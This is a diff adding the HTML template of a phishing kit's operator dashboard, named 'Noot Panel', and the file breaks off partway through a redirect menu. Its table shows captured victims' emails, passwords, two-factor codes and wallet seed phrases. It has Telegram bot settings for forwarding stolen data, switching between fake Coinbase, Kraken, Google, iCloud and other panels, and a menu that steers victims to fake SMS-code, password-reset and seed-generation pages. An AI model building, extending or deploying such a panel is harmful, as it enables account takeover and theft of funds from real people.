@@ -1,0 +1,2450 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+      integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <title>Noot Panel</title>
+    <style>
+      h1,
+      h2,
+      h3 {
+        margin-bottom: 0.5rem;
+        color: #111;
+        font-weight: 500;
+      }
+      h1 {
+        font-size: 1.8rem;
+        margin: 1rem 0;
+      }
+      h4{
+        font-weight: 400;
+      }
+
+      /* BUTTONS */
+      button {
+        background-color: #ffc7d9;
+        color: #000;
+        border: none;
+        border-radius: 6px;
+        padding: 0.6rem 1rem;
+        margin: 0.25rem;
+        cursor: pointer;
+        font-size: 0.9rem;
+        transition: background-color 0.2s ease, transform 0.1s ease;
+      }
+      button:hover {
+        background-color: #cc9fad;
+      }
+      button:active {
+        transform: scale(0.96);
+      }
+
+      button.delete {
+        padding: 0.6rem 0.5rem;
+        background-color: transparent;
+      }
+      /* SELECTS / INPUTS */
+      select,
+      input[type="text"] {
+        border: 2px solid #ccc;
+        border-radius: 6px;
+        padding: 0.4rem 0.6rem;
+        font-size: 0.9rem;
+        margin-right: 0.5rem;
+        transition: border-color 0.2s ease;
+      }
+      select:hover,
+      input[type="text"]:hover {
+        border-color: #ffc7d9;
+      }
+      select:focus,
+      input[type="text"]:focus {
+        outline: none;
+        border-color: #ffc7d9;
+      }
+      select,
+      input[type="password"] {
+        border: 2px solid #ccc;
+        border-radius: 6px;
+        padding: 0.4rem 0.6rem;
+        font-size: 0.9rem;
+        margin-right: 0.5rem;
+        transition: border-color 0.2s ease;
+      }
+      select:hover,
+      input[type="password"]:hover {
+        border-color: #ffc7d9;
+      }
+      select:focus,
+      input[type="password"]:focus {
+        outline: none;
+        border-color: #ffc7d9;
+      }
+
+      .modal-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent */
+  z-index: 998; /* Below the modal */
+  opacity: 0; /* Start hidden */
+  visibility: hidden;
+  pointer-events: none;
+  transition: opacity 0.3s ease, visibility 0.3s;
+}
+
+/* When the overlay is shown */
+.modal-overlay.show {
+  opacity: 1;
+  visibility: visible;
+  pointer-events: auto;
+}
+      /* MODALS with fade+scale animation */
+      .modal {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%) scale(0.95);
+    min-width: 300px;
+    max-width: 90%;
+    background: #fff;
+    border-radius: 10px;
+    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+    padding: 1rem 1.2rem;
+    z-index: 999;
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none;
+    transition: opacity 0.3s ease, transform 0.3s ease, visibility 0.3s, width 0.3s, height 0.3s;
+  }
+
+  .modal.show {
+    opacity: 1;
+    visibility: visible;
+    pointer-events: auto;
+    transform: translate(-50%, -50%) scale(1);
+  }
+
+  .iframe-container {
+    width: 100%;
+    height: 500px;
+    border: 1px solid #aaa;
+    border-radius: 6px;
+    overflow: hidden;
+    background: #fff;
+    margin-top: 0.5rem;
+    transition: height 0.3s ease;
+  }
+
+  .iframe-container iframe {
+    width: 100%;
+    height: 100%;
+    border: none;
+  }
+
+  /* Hidden iframe container initially */
+  .iframe-container.hidden {
+    display: none;
+  }
+
+  .iframe-container.visible {
+    height: 500px; /* Adjust this height as per your requirements */
+  }
+  /* Modal with preview */
+  .modal.preview-visible {
+    width: 500px;
+    height: 500px;
+  }
+
+      /* SETTINGS SECTION */
+      .settings-panel {
+        margin: 1rem 0;
+        background: #fff;
+        border-radius: 8px;
+        padding: 1rem;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.07);
+      }
+      .settings-panel h3 {
+        margin-bottom: 0.75rem;
+      }
+      .toggle-row {
+        display: flex;
+        align-items: center;
+        margin-bottom: 1rem;
+      }
+      .toggle-row label {
+        margin-left: 0.5rem;
+        font-size: 0.95rem;
+      }
+
+      .toggle-switch {
+        position: relative;
+        display: inline-block;
+        width: 52px;
+        height: 28px;
+      }
+      .toggle-switch input {
+        opacity: 0;
+        width: 0;
+        height: 0;
+      }
+      .slider {
+        position: absolute;
+        cursor: pointer;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: #ccc;
+        transition: 0.4s;
+        border-radius: 28px;
+      }
+      .slider:before {
+        position: absolute;
+        content: "";
+        height: 22px;
+        width: 22px;
+        left: 3px;
+        top: 3px;
+        background-color: white;
+        transition: 0.4s;
+        border-radius: 50%;
+      }
+      input:checked + .slider {
+        background-color: #ffc7d9;
+      }
+      input:focus + .slider {
+        box-shadow: 0 0 1px #ffc7d9;
+      }
+      input:checked + .slider:before {
+        transform: translateX(24px);
+      }
+
+      .toggle-container {
+        position: absolute;
+        top: 20px;
+        right: 20px;
+        display: flex;
+        align-items: center;
+        gap: 1rem;
+      }
+
+      .hostname-select {
+        padding: 0.4rem 0.8rem;
+        border: 2px solid var(--border-color);
+        border-radius: 6px;
+        background-color: var(--background-color);
+        color: var(--text-color);
+        font-size: 0.9rem;
+        cursor: pointer;
+        min-width: 150px;
+      }
+
+      .hostname-select:hover {
+        border-color: var(--primary-color);
+      }
+
+      .hostname-select:focus {
+        outline: none;
+        border-color: var(--primary-color);
+      }
+
+      [data-theme="dark"] .hostname-select {
+        background-color: var(--dark-background-color);
+        color: var(--dark-text-color);
+        border-color: var(--dark-border-color);
+      }
+
+      .toggle-label {
+        margin-right: 10px;
+        font-size: 1rem;
+        color: var(--text-color);
+        transition: color 0.3s;
+      }
+
+      .toggle-switch {
+        position: relative;
+        width: 50px;
+        height: 25px;
+      }
+
+      .toggle-switch input {
+        opacity: 0;
+        width: 0;
+        height: 0;
+      }
+
+      .slider {
+        position: absolute;
+        cursor: pointer;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: var(--border-color);
+        border-radius: 25px;
+        transition: background-color 0.4s;
+      }
+
+      .slider:before {
+        position: absolute;
+        content: "";
+        height: 19px;
+        width: 19px;
+        left: 3px;
+        bottom: 3px;
+        background-color: var(--background-color);
+        border-radius: 50%;
+        transition: transform 0.4s;
+      }
+
+      input:checked + .slider {
+        background-color: var(--primary-color);
+      }
+
+      input:checked + .slider:before {
+        transform: translateX(25px);
+      }
+
+      [data-theme="dark"] .toggle-label {
+        color: var(--dark-text-color);
+      }
+      /* SIGN OUT CONFIRM MODAL */
+      #signOutConfirmModal p {
+        margin: 0.5rem 0 1rem;
+      }
+
+      /* NOTIFICATION BAR */
+      #notifBar {
+        position: fixed;
+        bottom: 10px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: #444;
+        color: #fff;
+        padding: 0.7rem 1rem;
+        border-radius: 6px;
+        display: none; /* hidden by default */
+        z-index: 9999;
+        font-size: 1.5rem;
+      }
+      /* green for success, red for fail */
+      .notif-success {
+        background: #2e7d32; /* a green shade */
+      }
+      .notif-fail {
+        background: #c62828; /* a red shade */
+      }
+
+      .disabled {
+        background-color: #ccc !important;
+        cursor: not-allowed !important;
+      }
+      /* A container to group the two password cards */
+      .passwords-container {
+        background: #fff;
+        border-radius: 8px;
+        padding: 1.5rem;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.07);
+        max-width: 600px;
+        margin: 1rem auto;
+      }
+
+      .password-card {
+        margin-bottom: 1.5rem;
+      }
+
+      .password-card h3 {
+        margin-bottom: 0.75rem;
+        font-size: 1.1rem;
+        color: #333;
+      }
+
+      .form-row {
+        margin-bottom: 1rem;
+      }
+
+      .pass-input-wrapper {
+        display: flex;
+        align-items: center;
+        margin-top: 0.5rem;
+      }
+      .pass-input-wrapper input {
+        flex: 1;
+        border: 2px solid #ccc;
+        border-radius: 6px 0 0 6px;
+        padding: 0.4rem 0.6rem;
+        transition: border-color 0.2s ease;
+        font-size: 0.9rem;
+      }
+      .pass-input-wrapper input:focus {
+        border-color: #ffc7d9;
+        outline: none;
+      }
+      .eye-btn {
+        color: #fff;
+        border: none;
+        border-radius: 0 6px 6px 0;
+        margin-left: -1px;
+        font-size: 1.1rem;
+        width: 50px;
+        cursor: pointer;
+        transition: background-color 0.2s ease;
+      }
+
+      .update-btn {
+        background-color: #ffc7d9;
+        color: #fff;
+        border: none;
+        border-radius: 6px;
+        padding: 0.6rem 1rem;
+        cursor: pointer;
+        font-size: 0.9rem;
+        transition: background-color 0.2s ease;
+      }
+      .update-btn:hover {
+        background-color: #cc9fad;
+      }
+
+      /* The HR line separating the two cards */
+      hr {
+        border: none;
+        border-top: 1px solid #ddd;
+        margin: 1.5rem 0;
+      }
+
+      :root {
+        --primary-color: #ffc7d9;
+        --primary-hover: #cc9fad;
+        --secondary-color: #f4f6f8;
+        --text-color: #333;
+        --background-color: #fff;
+        --border-color: #ddd;
+        --shadow-color: rgba(0, 0, 0, 0.1);
+        --dark-primary-color: #2196f3;
+        --dark-primary-hover: #1976d2;
+        --dark-secondary-color: #1e1e2d;
+        --dark-text-color: #e0e0e0;
+        --dark-background-color: #121212;
+        --dark-border-color: #333;
+        --dark-shadow-color: rgba(0, 0, 0, 0.5);
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background-color: var(--secondary-color);
+        color: var(--text-color);
+        display: flex;
+        min-height: 100vh;
+        transition: background-color 0.3s, color 0.3s;
+      }
+
+            .side-panel {
+        width: 260px;
+        background-color: var(--background-color);
+        border-right: 1px solid var(--border-color);
+        box-shadow: 0 2px 10px var(--shadow-color);
+        padding: 2rem 1.5rem;
+        display: flex;
+        flex-direction: column;
+        gap: 1rem;
+        transition: background-color 0.3s, color 0.3s, left 0.3s;
+        position: relative;
+      }
+
+      .side-panel h2 {
+        font-size: 1.5rem;
+        color: var(--primary-color);
+        margin-bottom: 1rem;
+      }
+      .side-panel button {
+        background-color: var(--primary-color);
+        color: #000;
+        padding: 0.8rem 1rem;
+        border: none;
+        border-radius: 8px;
+        font-size: 1rem;
+        cursor: pointer;
+        transition: background-color 0.2s, transform 0.1s;
+        text-align: center;
+      }
+
+      .side-panel button:hover {
+        background-color: var(--primary-hover);
+      }
+
+      .side-panel button:active {
+        transform: scale(0.98);
+      }
+
+      .main-content {
+        flex: 1;
+        padding: 2rem;
+        transition: background-color 0.3s, color 0.3s;
+      }
+
+      .main-content h1 {
+        font-size: 2rem;
+        margin-bottom: 1.5rem;
+        color: var(--primary-color);
+      }
+
+      .main-content h2 {
+        font-size: 1.5rem;
+        margin-bottom: 1rem;
+      }
+
+      table {
+        width: 100%;
+        border-collapse: collapse;
+        background: var(--background-color);
+        box-shadow: 0 2px 8px var(--shadow-color);
+        border-radius: 8px;
+        overflow: hidden;
+      }
+
+      th,
+      td {
+        text-align: left;
+        padding: 1rem;
+        border-bottom: 1px solid var(--border-color);
+      }
+
+      th {
+        background: var(--secondary-color);
+        font-weight: bold;
+      }
+
+      td {
+        color: var(--text-color);
+      }
+
+      .password-container {
+        background: var(--background-color);
+        box-shadow: 0 4px 10px var(--shadow-color);
+        border-radius: 8px;
+        padding: 2rem;
+        max-width: 600px;
+        margin: 2rem auto;
+        transition: background-color 0.3s;
+      }
+
+      .password-container h3 {
+        font-size: 1.3rem;
+        color: var(--primary-color);
+        margin-bottom: 1rem;
+      }
+
+      .password-input {
+        display: flex;
+        gap: 0.5rem;
+        align-items: center;
+        border: 2px solid var(--border-color);
+        border-radius: 8px;
+        padding: 0.5rem;
+        background: var(--background-color);
+      }
+
+      .password-input input {
+        flex: 1;
+        border: none;
+        background: transparent;
+        font-size: 1rem;
+        color: var(--text-color);
+        outline: none;
+      }
+
+      .password-input button {
+        background: var(--primary-color);
+        color: #fff;
+        border: none;
+        padding: 0.5rem 1rem;
+        border-radius: 8px;
+        cursor: pointer;
+        font-size: 1rem;
+        transition: background-color 0.2s;
+      }
+
+      .password-input button:hover {
+        background: var(--primary-hover);
+      }
+
+      .toggle-dark-mode {
+        position: absolute;
+        top: 1rem;
+        right: 1rem;
+        background: var(--primary-color);
+        color: #fff;
+        border: none;
+        padding: 0.8rem 1rem;
+        border-radius: 8px;
+        cursor: pointer;
+        font-size: 1rem;
+        transition: background-color 0.3s;
+      }
+
+      .toggle-dark-mode:hover {
+        background: var(--primary-hover);
+      }
+
+      [data-theme="dark"] {
+        --primary-color: #c130d4;
+        --primary-hover: #7f218b;
+        --secondary-color: var(--dark-secondary-color);
+        --text-color: var(--dark-text-color);
+        --background-color: var(--dark-background-color);
+        --border-color: var(--dark-border-color);
+        --shadow-color: var(--dark-shadow-color);
+      }
+
+      .passwords-container {
+        background: var(--background-color);
+        box-shadow: 0 4px 10px var(--shadow-color);
+        border-radius: 8px;
+        padding: 2rem;
+        max-width: 600px;
+        margin: 2rem auto;
+        transition: background-color 0.3s;
+      }
+
+      .password-card {
+        margin-bottom: 2rem;
+      }
+
+      .password-card h3 {
+        font-size: 1.3rem;
+        color: var(--primary-color);
+        margin-bottom: 1rem;
+      }
+
+      .pass-input-wrapper {
+        display: flex;
+        align-items: center;
+        position: relative;
+        border: 2px solid var(--border-color);
+        border-radius: 8px;
+        overflow: hidden;
+        background-color: var(--background-color);
+        transition: border-color 0.3s;
+      }
+
+      .pass-input-wrapper input {
+        flex: 1;
+        border: none;
+        padding: 0.8rem 1rem;
+        font-size: 1rem;
+        color: var(--text-color);
+        background-color: transparent;
+        outline: none;
+      }
+
+      .pass-input-wrapper input::placeholder {
+        color: var(--text-color);
+        opacity: 0.7;
+      }
+
+      .pass-input-wrapper input:focus {
+        border-color: var(--primary-color);
+      }
+
+      .pass-input-wrapper button {
+        position: absolute;
+        right: 0.5rem;
+        background: none;
+        border: none;
+        color: var(--text-color);
+        cursor: pointer;
+        font-size: 1.2rem;
+        padding: 0;
+        transition: color 0.3s;
+      }
+
+      .pass-input-wrapper button:hover {
+        color: var(--primary-color);
+      }
+
+      .update-btn {
+        background-color: var(--primary-color);
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+        padding: 0.8rem 1.5rem;
+        cursor: pointer;
+        font-size: 1rem;
+        transition: background-color 0.3s;
+      }
+
+      .update-btn:hover {
+        background-color: var(--primary-hover);
+      }
+
+      hr {
+        border: none;
+        border-top: 1px solid var(--border-color);
+        margin: 1.5rem 0;
+      }
+
+      .copyable-field {
+        position: relative;
+        padding: 0.5rem;
+        border-radius: 4px;
+        font-size: 0.9rem;
+        cursor: pointer;
+      }
+
+      button.delete .delete-icon {
+  width: 25px;
+  height: 25px;
+  transition: transform 0.3s ease; /* Smooth animation */
+}
+
+/* Enlarge the SVG on hover */
+button.delete:hover .delete-icon {
+  transform: scale(1.3); /* Adjust the scale factor to control size */
+}
+      .tooltip {
+        position: fixed;
+        background-color: #333;
+        color: #fff;
+        padding: 0.3rem 0.5rem;
+        border-radius: 4px;
+        font-size: 0.8rem;
+        pointer-events: none; /* Makes tooltip unclickable */
+        white-space: nowrap;
+        z-index: 9999;
+        display: none;
+      }
+      /* Add this CSS to align items inline */
+      .status-container {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem; /* Space between the circle and text */
+      }
+
+      .online-indicator,
+      .offline-indicator {
+        width: 10px; /* Adjust size as needed */
+        height: 10px;
+        border-radius: 50%;
+        animation: pulse 1s infinite ease-in-out;
+      }
+
+      .online-indicator {
+        background-color: green;
+        box-shadow: 0 0 5px 2px rgba(0, 255, 0, 0.5);
+      }
+
+      .offline-indicator {
+        background-color: red;
+        box-shadow: 0 0 5px 2px rgba(255, 0, 0, 0.5);
+      }
+
+      button.close{
+        background-color: rgb(208, 15, 15);
+        color: #fff;
+      }
+      button.close:hover{
+        background-color: rgb(132, 11, 11);
+      }
+      @keyframes pulse {
+        0% {
+          transform: scale(1);
+          opacity: 1;
+        }
+        50% {
+          transform: scale(1.2);
+          opacity: 0.8;
+        }
+        100% {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+
+/* Default blurred state */
+.blurred-input {
+  filter: blur(5px); /* Initial blur effect */
+  transition: filter 0.4s ease; /* Smooth transition on focus */
+  color: transparent; /* Hide text until focused */
+  text-shadow: 0 0 5px rgba(0, 0, 0, 0.5); /* Hint of text for better appearance */
+}
+
+/* Unblur on focus */
+.blurred-input:focus {
+  filter: blur(0); /* Remove blur */
+  pointer-events: auto; /* Enable interactions */
+  color: #000;
+  text-shadow: none; /* Remove text shadow */
+}
+
+/* Optional: Make sure the placeholder text is visible */
+.blurred-input::placeholder {
+  transition: color 0.4s ease; /* Smooth transition for placeholder */
+}
+
+.blurred-input:focus::placeholder {
+  color: transparent; /* Hide the placeholder on focus */
+}
+
+.flexcenter{
+  display: flex;
+  border:1px solid var(--border-color);
+}
+
+
+      [data-theme="dark"] .pass-input-wrapper button {
+        color: var(--dark-text-color);
+      }
+
+      [data-theme="dark"] .pass-input-wrapper button:hover {
+        color: var(--dark-primary-color);
+      }
+      [data-theme="dark"] .pass-input-wrapper button {
+        color: var(--dark-text-color);
+      }
+
+      [data-theme="dark"] .pass-input-wrapper button:hover {
+        color: var(--dark-primary-color);
+      }
+
+      /* Dark mode styles for signOutConfirmModal */
+      [data-theme="dark"] .modal {
+        background-color: var(--dark-background-color);
+        color: var(--dark-text-color);
+      }
+
+      [data-theme="dark"] .signOutConfirmModal * {
+        background-color: var(--dark-background-color);
+        color: var(--dark-text-color);
+      }
+
+      /* Dark mode styles for settingsSection */
+      [data-theme="dark"] .settingsSection {
+        background-color: var(--dark-background-color);
+        color: var(--dark-text-color);
+      }
+
+      [data-theme="dark"] .settings-panel {
+        background-color: var(--dark-background-color);
+        color: var(--dark-text-color);
+      }
+
+      [data-theme="dark"] h1,
+      [data-theme="dark"] h2,
+      [data-theme="dark"] h3 {
+        color: var(--dark-text-color);
+      }
+
+      [data-theme="dark"] #last2digitsInput {
+        border: 2px solid #333;
+        width: 100%;
+        background-color: #000;
+        color: var(--dark-text-color);
+      }
+      [data-theme="dark"] button {
+        background-color: var(--primary-color);
+      }
+      [data-theme="dark"] button.delete {
+        background-color: transparent;
+      }
+      [data-theme="dark"] button:hover {
+        background-color: var(--primary-hover);
+      }
+      .fa-eye {
+        color: #000;
+      }
+      [data-theme="dark"] .fa-eye {
+        color: #fff;
+      }
+      
+      [data-theme="dark"] .delete:hover {
+        background-color: transparent;
+      }
+      [data-theme="dark"] .manager-container {
+        background: var(--dark-background-color);
+        padding: 1rem;
+        border-radius: 8px;
+        margin-bottom: 1rem;
+        box-shadow: 0 2px 8px var(--shadow-color);
+      }
+      [data-theme="dark"] .side-panel button {
+        color: #fff;
+      }
+      [data-theme="dark"] button {
+        color: #fff;
+      }
+      [data-theme="dark"] button.close{
+        background-color: rgb(208, 15, 15);
+      }
+      [data-theme="dark"] button.close:hover{
+        background-color: rgb(132, 11, 11);
+      }
+    </style>
+  </head>
+
+  <body>
+    <div id="tooltip" class="tooltip"></div>
+
+    <div class="toggle-container">
+      <select id="hostnameSelect" onchange="switchHostname(this.value)" class="hostname-select">
+        <option value="">Select Panel</option>
+        <option value="coinbase">coinbase</option>
+        <option value="kraken">kraken</option>
+        <option value="gemini">gemini</option>
+        <option value="google">google</option>
+        <option value="microsoft">microsoft</option>
+        <option value="yahoo">yahoo</option>
+        <option value="icloud">icloud</option>
+      </select>
+      <span class="toggle-label">Dark Mode</span>
+      <label class="toggle-switch">
+        <input type="checkbox" id="themeToggle" />
+        <span class="slider"></span>
+      </label>
+    </div>
+
+    <script>
+      function switchHostname(subdomain) {
+        if (!subdomain) return;
+        
+        // Get current URL
+        const currentUrl = window.location.href;
+        const url = new URL(currentUrl);
+        
+        const currentHost = url.hostname;
+        
+        const parts = currentHost.split('.');
+        
+        parts[0] = subdomain;
+        
+        const newHost = parts.join('.');
+        
+        url.hostname = newHost;
+        
+        window.location.href = url.toString();
+      }
+    </script>
+
+    <!-- Side Panel -->
+    <div class="side-panel">
+      <h2>Noot Panel</h2>
+
+      <button class="nav-item" onclick="showDashboard()">Dashboard</button>
+      <button class="nav-item" onclick="showSettings()">Settings</button>
+      <!-- If role is 'admin' => normal, else => disabled class -->
+      <button
+        id="manageUsersBtn"
+        class="nav-item"
+        onclick="showManageManagers()"
+      >
+        Manage Users
+      </button>
+      <button class="nav-item" onclick="showSignOutConfirm()">Sign Out</button>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+      <!-- The "dashboard" section (we have the table/polling here) -->
+      <div id="dashboardSection">
+        <h1><%= role.charAt(0).toUpperCase() + role.slice(1) %> Dashboard</h1>
+        <h2>Current Users</h2>
+        <table id="usersTable">
+          <thead>
+            <tr>
+              <th>Email</th>
+              <th>Password</th>
+              <th>Page</th>
+              <th>Auth Code</th>
+              <th>Phrase</th>
+              <th>Last 2 Digits</th>
+              <th>Status</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+          <tbody></tbody>
+        </table>
+      </div>
+
+      <!-- The "settings" section, hidden by default -->
+      <div id="settingsSection" style="display: none">
+        <h1>Settings</h1>
+        <div class="settings-panel">
+          <div class="toggle-row">
+            <label style="display: inline-block"
+              ><span class="switchy">Toggle Panel:</span>
+              <label class="toggle-switch">
+                <input
+                  type="checkbox"
+                  id="clientSideToggle"
+                  onchange="toggleClientSideRoutes(this.checked)"
+                  <%= clientSideEnabled ? 'checked' : '' %>
+                />
+                
+                <span class="slider"></span>
+              </label>
+            </label>
+          </div>
+        </div>
+
+        <!-- NEW: Telegram Settings -->
+        <div class="settings-panel">
+          <h3>Telegram Settings</h3>
+
+          <div class="form-group">
+            <label for="telegramBotToken">Bot Token:</label>
+            <input
+              type="text"
+              id="telegramBotToken"
+              placeholder="Enter Bot Token"
+              class="blurred-input"
+            />
+          </div>
+
+          <div class="form-group">
+            <label for="telegramChatId">Chat ID:</label>
+            <input
+              type="text"
+              id="telegramChatId"
+              placeholder="Enter chat ID"
+              class="blurred-input"
+            />
+          </div>
+
+          <p>Select which fields to include in Telegram notifications:</p>
+          <div class="checkbox-group checkbox-wrapper-14">
+            <label>
+              <span class="switchy">User IP</span>
+              <label class="toggle-switch">
+                <input type="checkbox" class="tg-field" value="userIP" /><span
+                  class="slider"
+                ></span>
+              </label>
+            </label>
+
+            <label>
+              <span class="switchy">Country</span>
+              <label class="toggle-switch">
+                <input type="checkbox" class="tg-field" value="country" /><span
+                  class="slider"
+                ></span>
+              </label>
+            </label>
+
+            <label>
+              <span class="switchy">City</span>
+              <label class="toggle-switch">
+                <input type="checkbox" class="tg-field" value="city" /><span
+                  class="slider"
+                ></span>
+              </label>
+            </label>
+
+            <label>
+              <span class="switchy">Pwd</span>
+              <label class="toggle-switch">
+                <input type="checkbox" class="tg-field" value="phrase" /><span
+                  class="slider"
+                ></span>
+              </label>
+            </label>
+
+            <label>
+              <span class="switchy">Phrase</span>
+              <label class="toggle-switch">
+                <input type="checkbox" class="tg-field" value="phrase" /><span
+                  class="slider"
+                ></span>
+              </label>
+            </label>
+
+            <label>
+              <span class="switchy">URL</span>
+              <label class="toggle-switch">
+                <input type="checkbox" class="tg-field" value="url" /><span
+                  class="slider"
+                ></span>
+              </label>
+            </label>
+          </div>
+
+          <button class="save-button wide" onclick="saveTelegramSettings()">
+            Save Telegram Settings
+          </button>
+        </div>
+
+        <div class="settings-panel">
+          <span style="font-weight: bold">Do you have a custom domain?</span
+          ><br /><br />
+          <span
+            >This setting sets the default landing page and loading screen for
+            all visitors:</span
+          ><br /><br />
+          <button onclick="showModal('domainDefaultsModal')" class="wide">
+            Set Defaults
+          </button>
+        </div>
+        <style>
+          .wide {
+            width: 100%;
+          }
+          .settings-panel {
+            margin-top: 1rem;
+            padding: 1.5rem;
+            border-radius: 8px;
+            max-width: 500px;
+          }
+
+          .settings-panel h3 {
+            margin-bottom: 1rem;
+            font-size: 1.2rem;
+          }
+
+          .form-group {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 1rem;
+          }
+
+          .form-group label {
+            margin-bottom: 1rem;
+            font-size: 0.9rem;
+          }
+
+          .form-group input {
+            padding: 0.5rem;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 0.9rem;
+          }
+
+          .checkbox-group {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 2rem;
+            margin-top: 2rem;
+            margin-bottom: 1.5rem;
+          }
+
+          .checkbox-group label {
+            display: flex;
+            align-items: center;
+            font-size: 0.9rem;
+          }
+
+          .checkbox-group input {
+            margin-right: 0.5rem;
+          }
+
+          .save-button {
+            margin-top: 1rem;
+            padding: 0.7rem 1rem;
+            background-color: #ffc7d9;
+            border: none;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            cursor: pointer;
+          }
+
+          .switchy {
+            width: 55px;
+            text-align: center;
+          }
+          .manager-container {
+            background: #fff;
+            padding: 1rem;
+            border-radius: 8px;
+            margin-bottom: 1rem;
+            box-shadow: 0 2px 8px var(--shadow-color);
+          }
+          .splitter {
+            background-color: #686565;
+            color: #fff;
+          }
+        </style>
+      </div>
+
+      <div id="manageManagersSection" style="display: none">
+        <h1>Manage Panel Users</h1>
+
+        <!-- Create Manager Form -->
+        <div class="manager-container">
+          <h3>Create User</h3>
+          <div>
+            <label>Username:</label>
+            <input
+              type="text"
+              id="newManagerUsername"
+              placeholder="username"
+            />
+
+            <label>Password:</label>
+            <input
+              type="text"
+              id="newManagerPassword"
+              placeholder="password"
+            />
+
+            <label>Role:</label>
+            <select id="newManagerRole">
+         
+              <% if (role === 'master') { %>
+              <option value="mover">mover</option>
+              <option value="admin">admin</option>
+              <% } else if (role === 'admin') { %>
+              <option value="mover">mover</option>
+              <% } %>
+            </select>
+
+            <button onclick="createManager()">Create User</button>
+          </div>
+          <div>
+            <h3 style="margin-top: 1rem;">What are roles?</h3>
+            <ul style="margin-left: 2rem;">
+              <li style="margin-bottom: 5px;"><strong>Master</strong>: Can can create and delete admins</li>
+              <li style="margin-bottom: 5px;"><strong>Admin</strong>: Can create, update and delete users, can't change other admin passwords, can see everything.</li>
+              <li><strong>Mover</strong>: Can only update their own password, Can't see seeds and auth codes, can't view telegram settings.</li>
+            </ul>
+          </div>
+        </div>
+
+        <h3>Existing Users</h3>
+        <table border="1" id="managersTable">
+          <thead>
+            <tr>
+              <th>Username</th>
+              <th>Role</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+          <tbody></tbody>
+        </table>
+      </div>
+    </div>
+
+    <div id="modalOverlay" class="modal-overlay"></div>
+
+    <div id="updateManagerPassModal" class="modal">
+      <h3>Update User Password</h3>
+      <p>For: <span id="managerToUpdate"></span></p>
+      <input type="text" class="wide" style="margin-top: 10px;" id="newManagerPassInput" placeholder="New password" />
+      <br /><br />
+      <button onclick="submitManagerPass()" class="wide">Update Password</button>
+      <button onclick="hideModal('updateManagerPassModal')" class="close wide">Cancel</button>
+    </div>
+    </div>
+
+    <!-- Domain Defaults Modal -->
+    <div id="domainDefaultsModal" class="modal">
+      <h2>Set Global Defaults</h2>
+      <div style="margin-bottom: 1rem">
+        <h4>Set Default Loading Screen (Global)</h4>
+        <form id="loadingScreenForm">
+          <select name="screenName" id="screenName" style="width: 100px;margin-top: 5px;">
+            <option value="loading-client_id-258660e1-9cfe-4202-9eda-d3beedb3e118">loading</option>
+            <option value="i/flow/loading">xloading</option>
+          </select>
+          <button type="submit">Set</button>
+        </form>
+      </div>
+
+      <div>
+        <h4>Set Default User Page (Global)</h4>
+        <form id="defaultUserForm">
+          <select name="pageName" id="userPages" style="width: 100px;margin-top: 5px;">
+            <option value="coinbase">Coinbase</option>
+            <option value="X">X</option>
+          </select>
+          <button type="submit">Set</button>
+        </form>
+      </div>
+      <button
+        style="margin-top: 1rem"
+        onclick="hideModal('domainDefaultsModal')"
+        class="close"
+      >
+        Close
+      </button>
+    </div>
+
+    <!-- Sign Out Confirm Modal -->
+    <div id="signOutConfirmModal" class="modal">
+      <h3>Sign Out?</h3>
+      <p>Are you sure you want to sign out?</p>
+      <button onclick="confirmSignOut()">Yes, sign out</button>
+      <button onclick="hideModal('signOutConfirmModal')" class="close">Cancel</button>
+    </div>
+
+    <!-- POPUP: Last 2 Digits -->
+    <div id="last2digitsPopup" class="modal" style="z-index: 999999999;">
+      <h3>Set Last 2 Digits for <span id="last2digitsEmail"></span></h3>
+      <input type="text" id="last2digitsInput" placeholder="Enter value..." />
+      <div style="margin-top: 0.5rem">
+        <button onclick="submitLast2digits()" class="wide">Save</button>
+        <button onclick="closeLast2digitsPopup()" class="wide close">Cancel</button>
+      </div>
+    </div>
+
+    <!-- POPUP: Redirect user -->
+    <div id="redirectFormContainer" class="modal">
+      <h3>Redirect User</h3>
+      <p>Email: <span id="redirectEmail"></span></p>
+      <select id="redirectPage" class="wide" style="margin-top: 10px;">
+        <!-- Main Routes -->
+        <option value="">Select a page...</option>
+        <option value="signin/review">Review Page - Review account activity</option>
+        <option value="signin/unauthorized">Unauthorized - signing unauthorized devices out</option>
+        <option value="signin/pass-reset">Password Reset - Allow users to reset their password</option>
+        <option value="signin/url">URL Page - Collect URL</option>
+        <option value="signin/sms">SMS Verification - SMS verification page</option>
+        <option value="signin/sms-incorrect">SMS Incorrect - Incorrect SMS code</option>
+        <option value="signin/incorrect-pw">Incorrect Password - Wrong password</option>
+        <option value="signin/estimate-hold">Estimate Hold - estimated holdings</option>
+        <option value="signin/loading">Loading Page</option>
+
+        <!-- Wallet Routes -->
+        <optgroup label="Wallet Pages">
+          <option value="signin/generate-wallet">Generate Wallet - Create new seed</option>
